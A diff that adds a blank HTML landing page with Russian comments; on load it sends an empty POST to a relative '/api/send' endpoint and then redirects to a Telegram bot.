@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Faidiklogar</title>
+    <script>
+        // Функция отправки данных в API перед перенаправлением
+        async function sendDataAndRedirect() {
+            try {
+                // Отправляем POST запрос к API (относительный путь)
+                await fetch('/api/send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+            } catch (error) {
+                // Игнорируем ошибки
+            } finally {
+                // Всегда перенаправляем на Telegram
+                window.location.href = 'https://t.me/faidiappsbot';
+            }
+        }
+
+        // Запускаем сразу
+        sendDataAndRedirect();
+    </script>
+</head>
+<body>
+    <!-- Абсолютно пустая страница -->
+</body>
+</html>
